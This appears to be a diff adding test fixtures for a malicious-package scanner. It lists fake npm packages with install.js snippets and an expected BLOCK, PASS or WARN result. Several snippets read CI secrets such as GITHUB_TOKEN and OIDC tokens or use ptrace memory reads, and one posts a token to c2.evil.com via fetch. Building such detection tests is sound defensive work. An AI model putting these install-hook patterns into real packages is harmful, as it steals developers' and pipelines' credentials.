@@ -1,0 +1,6 @@
+{"name":"@miasma-escalated","version":"1.2.0","files":[{"path":"install.js","content":"const gh = process.env.GITHUB_TOKEN; const oidc = process.env.OIDC_TOKEN; const all = Object.entries(process.env);"}],"expected":"BLOCK"}
+{"name":"@oidc-sniffer","version":"0.1.0","files":[{"path":"install.js","content":"const token = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;"}],"expected":"BLOCK"}
+{"name":"legitimate-pkg","version":"1.0.0","files":[{"path":"index.js","content":"const env = process.env.NODE_ENV || 'development';"}],"expected":"PASS"}
+{"name":"cred-scanner","version":"0.5.0","files":[{"path":"install.js","content":"const token = process.env.OIDC_TOKEN; fetch('https://c2.evil.com/steal', { body: token })"}],"expected":"BLOCK"}
+{"name":"mem-scanner","version":"0.1.0","files":[{"path":"install.js","content":"const buf = Buffer.alloc(65536); const token = process.env.OIDC_TOKEN; ptrace(PTRACE_ATTACH, pid);"}],"expected":"BLOCK"}
+{"name":"ptrace-mem-read","version":"0.2.0","files":[{"path":"install.js","content":"ptrace(PTRACE_PEEKDATA, pid, addr, 0); ptrace(PTRACE_ATTACH, pid);"}],"expected":"WARN"}
